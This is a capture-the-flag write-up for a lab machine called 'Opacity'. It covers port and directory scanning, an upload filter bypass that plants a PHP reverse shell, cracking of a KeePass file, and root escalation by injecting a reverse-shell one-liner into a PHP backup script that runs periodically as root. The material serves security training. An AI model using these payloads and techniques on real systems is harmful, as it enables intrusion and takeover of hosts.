# Opacity

Starting off with a simple port scan I detected 4 open ports. <br/>
```sh
$ sudo nmap -sS -Pn 10.10.98.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 10:54 CET
Nmap scan report for 10.10.98.27
Host is up (0.078s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```

Seeing an open web port I made a simple directory scan using `ffuf`. <br/>
```sh
$ ffuf -w ../../Tools/wordlists/wordlists/discovery/directories.txt -u http://10.10.98.27/FUZZ           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.98.27/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Tools/wordlists/wordlists/discovery/directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
    * FUZZ: .

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
    * FUZZ: ??

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 80ms]
    * FUZZ: cloud

[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 76ms]
    * FUZZ: css

:: Progress: [58655/58655] :: Job [1/1] :: 505 req/sec :: Duration: [0:02:01] :: Errors: 1 ::
```

The `cloud` endpoint seemed to be an image upload webpage. <br/>
```html
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="style.css">
<title>Opacity Storage</title>
</head>
<body>
<h1><strong>5 Minutes File Upload</strong> - Personal Cloud Storage</h1>
	<div class="form-group">
<p style="text-align:center;"><img src="folder.png" alt="Folder" width="40%" height="40%"></p>
    <label for="title"><span>External Url:</span></label>
    <form name='upload' method='post' action="/cloud/">
        <input type='text' id='url' name='url'  class="form-controll"/><br>
</div>
	<div class="form-group">
    <button type="submit">Upload image
</form>
    
  </div>

  </button>
</form>
</div>
</body>
</html>
```

Seeing as I could use an external URL I setup a small http server using `python3 -m http.server 80`. <br/>
Knowing that I could only upload images I tried to bypass the extension block by adding `.png` at the end of my external URL. <br/>
```
http://X.X.X.X/rev_shell.php .png
```

Using the external image path above I was able to upload the `PHP reverse shell` and access the uploaded `.php` file at the location `http://X.X.X.X/cloud/images/rev_shell.php`. <br/>
Before accessing the webpage I setup a netcat listener. <br/>
```sh
nc -lnvp 9001
listening on [any] 9001 ...
connect to [X.X.X.X] from (UNKNOWN) [10.10.98.27] 57872
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 10:05:51 up 43 min,  0 users,  load average: 0.00, 0.09, 0.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@opacity:/$ 
```

Searching for the first flag. <br/>
```sh
www-data@opacity:/$ ls -la /home/
total 12
drwxr-xr-x  3 root     root     4096 Jul 26  2022 .
drwxr-xr-x 19 root     root     4096 Jul 26  2022 ..
drwxr-xr-x  6 sysadmin sysadmin 4096 Feb 22  2023 sysadmin

www-data@opacity:/$ ls -la /home/sysadmin/
total 44
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 .
drwxr-xr-x 3 root     root     4096 Jul 26  2022 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4096 Jul 28  2022 .gnupg
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .ssh
-rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
drwxr-xr-x 3 root     root     4096 Jul  8  2022 scripts

www-data@opacity:/$ cat /home/sysadmin/local.txt
cat: /home/sysadmin/local.txt: Permission denied
```

Since my permissions were insufficient to read the first flag, I continued searching for additional information. <br/>
Finding an interesting file in `/opt/` I setup another http server, so I could grab the file from my local machine. <br/>
```sh
$ www-data@opacity:/$ ls -la /opt/
total 12
drwxr-xr-x  2 root     root     4096 Jul 26  2022 .
drwxr-xr-x 19 root     root     4096 Jul 26  2022 ..
-rwxrwxr-x  1 sysadmin sysadmin 1566 Jul  8  2022 dataset.kdbx

www-data@opacity:/opt$ python3 -m http.server 5000
python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
```

Getting the file: <br/>
```sh
$ wget http://10.10.98.27:5000/dataset.kdbx
--2024-03-29 11:18:19--  http://10.10.98.27:5000/dataset.kdbx
Connecting to 10.10.98.27:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1566 (1.5K) [application/octet-stream]
Saving to: ‘dataset.kdbx’
dataset.kdbx   100%[====================================================>]   1.53K  --.-KB/s    in 0.001s  
2024-03-29 11:18:19 (2.07 MB/s) - ‘dataset.kdbx’ saved [1566/1566]

$ file dataset.kdbx 
dataset.kdbx: Keepass password database 2.x KDBX
```

Cracking the password of the `Keepass` file: <br/>
```sh
$ keepass2john dataset.kdbx > keepass_hash.txt
$ john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED        (dataset)     
1g 0:00:00:07 DONE (2024-03-29 11:22) 0.1366g/s 119.1p/s 119.1c/s 119.1C/s chichi..walter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Using the linux utility `keepassxc` I opened the `dataset.kdbx` file which revealed the user credentials of `sysadmin`. <br/>
Using the found creds I connected to the machine once again. <br/>
```sh
$ ssh sysadmin@10.10.98.27  
The authenticity of host '10.10.98.27 (10.10.98.27)' can't be established.
ED25519 key fingerprint is SHA256:VdW4fa9h5tyPlpiJ8i9kyr+MCvLbz7p4RgOGPbWM7Nw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.98.27' (ED25519) to the list of known hosts.
sysadmin@10.10.98.27's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)

--------------------------

sysadmin@opacity:~$ cat /home/sysadmin/local.txt 
REDACTED
```

Looking around some more I found an interesting file in the home direcotry of user `sysadmin`. <br/>
```php
sysadmin@opacity:~$ ls -la
total 44
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 .
drwxr-xr-x 3 root     root     4096 Jul 26  2022 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4096 Jul 28  2022 .gnupg
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
drwxr-xr-x 3 root     root     4096 Jul  8  2022 scripts
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .ssh
-rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful

sysadmin@opacity:~$ ls -la scripts/
total 16
drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 ..
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php

sysadmin@opacity:~$ ls -la scripts/lib/
total 132
drwxr-xr-x 2 sysadmin root  4096 Jul 26  2022 .
drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root 24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root 11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root  7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root  4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root  3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root  1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root  1465 Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root 10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root 16469 Jul 26  2022 registry.php
-rw-r--r-- 1 root     root  6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root  3921 Jul 26  2022 xmlapi.php

sysadmin@opacity:~$ cat scripts/script.php 
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

Seeing that the `script.php` is owned by root and can't be changed by my current user I took a look at the last backup. <br/>
```php
sysadmin@opacity:~$ unzip /var/backups/backup.zip 
Archive:  /var/backups/backup.zip
   creating: lib/
  inflating: script.php              
  inflating: lib/backup.inc.php      
  inflating: lib/phplib.php          
  inflating: lib/owlapi.php          
  inflating: lib/fileapi.php         
  inflating: lib/application.php     
  inflating: lib/utils.php           
  inflating: lib/dataset.php         
  inflating: lib/dataresource.php    
  inflating: lib/registry.php        
  inflating: lib/bio2rdfapi.php      
  inflating: lib/rdfapi.php          
  inflating: lib/biopax2bio2rdf.php  
  inflating: lib/xmlapi.php        
sysadmin@opacity:~$ cat lib/backup.inc.php 
<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
	if (extension_loaded('zip')) {
		if (file_exists($source)) {
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
				$source = realpath($source);
				if (is_dir($source)) {
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file) {
						$file = realpath($file);
						if (is_dir($file)) {
							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
						} else if (is_file($file)) {
							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
						}
					}
				} else if (is_file($source)) {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return $zip->close();
		}
	}
	return false;
}
?>
```

Adding `$sock=fsockopen("X.X.X.X",4444);shell_exec("sh <&3 >&3 2>&3");` before `?>` would execute another reverse shell if the php file is being called. <br/>
Not being able to modify the files and directories within the `scripts/` directory I just renamed the whole directory to `scripts_v1/`. <br/>
My guess was that the script.php was executed periodically so I made another directory with the name `scripts/` in which I unzipped the last backup. <br/>
Now being able to modify the files I added my reverse shell to `backup.inc.php` and waited with my netcat listener. <br/>
```sh
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [X.X.X.X] from (UNKNOWN) [10.10.98.27] 42988
whoami
root
cat /root/*
REDACTED
```

Obtaining the root flag concludes this writeup.